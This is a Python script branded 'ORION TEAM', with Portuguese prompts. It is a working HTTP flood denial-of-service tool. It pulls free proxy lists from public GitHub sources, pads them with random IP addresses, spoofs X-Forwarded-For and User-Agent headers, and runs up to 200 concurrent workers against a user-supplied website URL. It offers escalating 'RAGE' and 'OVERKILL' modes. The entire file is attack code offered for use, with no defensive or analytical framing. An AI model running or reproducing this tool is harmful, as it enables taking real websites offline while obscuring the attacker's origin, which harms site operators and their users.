#!/usr/bin/env python3
"""
ORION TEAM - 
"""

import sys
import asyncio
import aiohttp
import random
import re
import os
import itertools
import requests
import string
import time
import platform
from colorama import init, Fore, Style, Back

init(autoreset=True)

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_banner():
    banner = f"""
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¡€â €â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£ â žâ ƒâ €â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â¡ â šâ â €â¢°â €â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¡¼â ¦â£„â¡€â €â €â €â €â €â €â €â €â ²â£â €â €â €â €â¢¸â €â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢°â ƒâ €â €â ‰â ‰â ’â ’â¢²â €â €â €â €â €â£¸â €â €â €â €â¢¸â¡€â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â£°â ƒâ €â €â €â €â €â €â €â¢»â €â €â¢€â¡ â –â â €â €â €â €â¢¸â¢£â¡€â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â£”â â €â €â €â €â €â €â €â €â €â ‰â ‰â ‰â €â €â €â €â €â €â €â£§â£´â ‡â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â£¤â ¤â£¤â ¤â ¤â ¤â ¤â â¡–â €â €â €â ˆâ¢³â¡€â €â €â €â €â¢ â£€â €â €â €â €â €â €â €â €â €â €â €â €â ™â Žâ €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â ˆâ¢¢â¡€â €â €â €â €â ¸â¡€â €â €â €â£ â œâ â €â €â €â €â¡â €â¢ˆâ¡‡â €â €â €â €â €â €â €â €â €â €â €â¡°â¢¤â¡€â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â ‘â£„â €â €â €â €â ™â ’â šâ ‰â €â €â €â €â €â €â ˜â¢·â¡¤â¢¾â â €â €â €â €â €â €â €â €â£€â ”â ‹â €â €â ˜â£†â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â ˆâ ³â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ‰â šâ €â €â €â €â €â €â£€â ´â Šâ €â €â €â €â €â¡â â ™â ¢â£„â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â ˆâ¡–â ¦â¡„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¡´â šâ â €â €â €â €â €â €â¡œâ â €â €â €â ˆâ ³â¡€â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â ¹â£´â£·â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â¡„â €â €â €â €â €â €â €â €â¢€â Žâ €â €â €â €â €â €â €â ™â£„â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â ˆâ¡†â €â €â €â €â €â €â €â €â €â €â €â €â ¾â ‹â €â €â €â €â €â €â €â €â¡ â ƒâ €â €â €â €â €â €â €â €â €â ˜â¡€â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â¢ â žâ €â €â ›â ’â €â â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¡¸â â €â €â €â €â €â €â €â €â €â €â €â£§â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â¢°â ƒâ €â €â €â €â €â €â¢€â¡€â €â €â €â €â €â €â €â €â €â €â €â €â£ â¢ â ƒâ €â €â €â €â €â €â €â €â €â €â €â €â¢¸â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â ˆâ¡†â €â €â €â €â €â¡´â ‰â¢ â €â €â €â €â €â €â €â €â €â €â£ â Šâ ¸â Žâ£ â£¶â£¶â£¶â£¶â£¦â¡€â €â €â €â €â €â¢€â â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â ¸â¡„â €â €â €â¢¸â â €â¢¸â €â €â €â €â¢°â¡€â €â €â£€â žâ â €â €â£¼â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡†â €â €â €â €â¡žâ €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â¢€â£ â ´â ƒâ €â €â €â¢¸â¡€â €â ¸â €â €â €â €â£â ƒâ¢€â –â¢â¡„â €â €â¢¸â£¿â£¿â£¿â¡‡â¢ˆâ£¾â£¿â£¿â£¿â „â €â €â¢¸â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â¢¯â â €â €â €â €â €â €â €â £â¡€â €â €â €â €â¢°â žâ¢€â ƒâ¢ â£¿â£¿â¡„â €â ˆâ¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ‡â €â €â €â €â ™â ¢â£„
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â¢¸â €â €â €â €â €â €â €â €â €â ˆâ â €â €â €â €â €â£¸â €â£¿â£¿â£¿â£·â €â €â ˆâ ›â ¿â¢¿â£¿â ¿â Ÿâ ƒâ €â €â €â €â €â €â£ â ƒ
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â ˆâ ‰â ‰â ‘â¢„â €â¡ â „â €â €â €â €â €â €â €â €â €â¡‡â €â ¿â â ™â Ÿâ €â €â €â €â €â €â â €â¡€â €â €â¢€â£ â ´â ’â ‚â â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â ‰â €â¢¸â €â €â €â£¤â¡€â €â €â €â €â£‡â €â €â €â €â €â €â¢€â¡´â¢„â£€â£¤â£¶â£¿â ‡â €â¢ â Žâ â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â ˜â¡†â €â €â£¿â£·â£¿â €â €â €â ˜â¡´â ‰â ²â¡´â ‰â ™â£‡â €â €â¢¹â£¿â£¿â£¿â €â¢€â ‡â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â ƒâ €â €â¢¸â£¿â£¿â£¦â €â €â£°â ƒâ €â¢€â¡‡â €â €â£¿â£„â£ â£¾â£¿â£¿â¡‡â €â¢¸â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¸â¡€â €â ¸â£¿â£¿â£¿â£·â£¤â£¿â£¤â£€â£¾â£§â£„â£¼â£¿â£¯â£¿â£¿â£¿â¡¿â â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¸â¡‡â €â €â¢»â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¿â£¿â ‡â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â¡¸â â €â €â ˜â â €â ˜â¡¿â â ™â â ™â£¿â ‹â ‰â¢»â¡Ÿâ €â ˆâ¡â €â €â €â¢ â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â ™â¢¢â¡€â €â €â â¢¦â£ â¢¥â£„â£ â£€â €â£¸â¡€â¢€â£¼â£‡â£€â¡¼â â €â €â£€â ¼â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¡‡â¢ â£„â €â €â â €â ™â â ˜â ›â â »â ›â ˆâ¡™â ‰â €â£ â ”â ‹â â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ‘â ƒâ ˆâ ¢â¡€â €â €â €â €â €â €â €â €â €â¢ â ‡â£ â žâ â €â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ±â¢¦â¡€â¢€â¡€â €â €â €â €â£€â£ºâ ‹â â €â €â €â €â €â €â €â €â €â €â €â €â €â €
{Fore.LIGHTGREEN_EX}â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ˆâ ‰â ˆâ ‰â ‰â ‰â ‰â ˆâ â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
{Style.RESET_ALL}
"""
    print(banner)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
]

proxy_sources = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]

class AttackManager:
    def __init__(self):
        self.target_url = ""
        self.num_requests = 0
        self.max_concurrent = 100
        self.running = False
        self.sent = 0
        self.ok = 0
        self.fail = 0
        
    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=5) as response:
                    text = await response.text()
                    return re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
            except:
                return []

    async def get_all_ips(self, num):
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        while len(all_ips) < num:
            all_ips.append(f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}")
        return all_ips[:num]

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "Accept": "*/*",
            "Cache-Control": "no-cache",
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=3) as response:
                self.sent += 1
                if response.status in [200, 201, 202, 301, 302, 403, 404, 500, 502, 503]:
                    self.ok += 1
                else:
                    self.fail += 1
                print(f"{Fore.GREEN}[+] {ip_address} | {response.status}{Fore.RESET}")
        except asyncio.TimeoutError:
            self.sent += 1
            self.fail += 1
            print(f"{Fore.YELLOW}[!] {ip_address} | TIMEOUT{Fore.RESET}")
        except:
            self.sent += 1
            self.fail += 1
            print(f"{Fore.RED}[-] {ip_address} | FAIL{Fore.RESET}")

    async def attack_worker(self, session, ip_cycle):
        while self.running:
            await self.send_request(session, next(ip_cycle))
            await asyncio.sleep(0.005)

    async def attack(self, num_proxies):
        ip_list = await self.get_all_ips(num_proxies)
        ip_cycle = itertools.cycle(ip_list)

        print(f"\n{Fore.RED}[!] INICIANDO ATAQUE{Fore.RESET}")
        print(f"{Fore.YELLOW}[â†’] {self.target_url}{Fore.RESET}")
        print(f"{Fore.YELLOW}[â†’] {len(ip_list)}{Fore.RESET}\n")
        
        input(f"{Fore.GREEN}[>] PRESSIONE ENTER PARA INICIAR{Fore.RESET}")

        start_time = time.time()
        self.sent = 0
        self.ok = 0
        self.fail = 0
        
        async def worker():
            async with aiohttp.ClientSession() as session:
                await self.attack_worker(session, ip_cycle)

        tasks = [worker() for _ in range(self.max_concurrent)]
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.YELLOW}[!] INTERROMPIDO{Fore.RESET}")
        
        elapsed = time.time() - start_time

    def run(self, url, proxies, threads):
        self.target_url = url
        self.max_concurrent = threads
        self.running = True
        
        try:
            asyncio.run(self.attack(proxies))
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.YELLOW}[!] INTERROMPIDO{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] ERRO: {e}{Fore.RESET}")

def main():
    clear_screen()
    print_banner()
    
    print(f"{Fore.CYAN}RAGE - 50 THREADS{Fore.RESET}")
    print(f"{Fore.CYAN}OVERKILL - 200 THREADS{Fore.RESET}")
    print(f"{Fore.CYAN}HEALTH - 10 THREADS{Fore.RESET}")
    
    modo = input(f"\n{Fore.GREEN}[>] {Fore.RESET}").lower()
    
    if modo == "rage":
        threads = 50
    elif modo == "overkill":
        threads = 200
        confirm = input(f"{Fore.RED}[>] CONFIRMAR? (y/N): {Fore.RESET}")
        if confirm.lower() != 'y':
            sys.exit(0)
    elif modo == "health":
        threads = 10
    else:
        print(f"{Fore.RED}[!] MODO INVALIDO{Fore.RESET}")
        sys.exit(1)
    
    url = input(f"\n{Fore.WHITE}[>] URL DO SITE RECEBIDOR (https://site.com): {Fore.RESET}")
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    try:
        num_prox = int(input(f"\n{Fore.WHITE}[>] QUANTAS PROXIES: {Fore.RESET}"))
    except:
        num_prox = 100
    
    attack = AttackManager()
    attack.run(url, num_prox, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] INTERROMPIDO{Fore.RESET}")
        sys.exit(0)
